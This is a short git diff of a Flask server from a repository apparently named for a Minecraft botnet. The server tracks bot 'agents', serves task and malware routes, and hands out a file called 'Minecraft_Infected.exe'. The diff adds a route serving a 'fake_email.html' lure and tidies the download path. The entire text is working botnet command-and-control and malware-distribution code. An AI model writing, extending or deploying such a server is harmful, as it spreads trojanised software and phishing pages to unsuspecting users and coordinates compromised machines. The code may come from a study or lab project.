@@ -11,8 +11,7 @@ import time
 
 app = Flask(__name__)
 # app.config.from_file('./secrets/config.json', load=json.load)
-DOWNLOAD_PATH = "C:/Users/Alexa/Documents/GitHub/MALW-MinecraftBotnet/API/downloads"
-# DOWNLOAD_PATH = "/home/flask_app/BotnetAPI/downloads"
+DOWNLOAD_PATH = os.path.dirname(os.path.abspath(__file__)) + "/downloads"
 
 #Agents
 agents_dict = dict()
@@ -53,6 +52,10 @@ def getMalware():
 @app.route('/minecraft', methods=['GET'])
 def getMinecraftv():
     return send_file(os.path.join(DOWNLOAD_PATH, "Minecraft_Infected.exe"))
+
+@app.route('/email', methods=['GET'])
+def getEmail():
+    return send_file(os.path.join(DOWNLOAD_PATH, "fake_email.html"))
 
 @app.route('/task1', methods=['GET'])
 def getTask1():
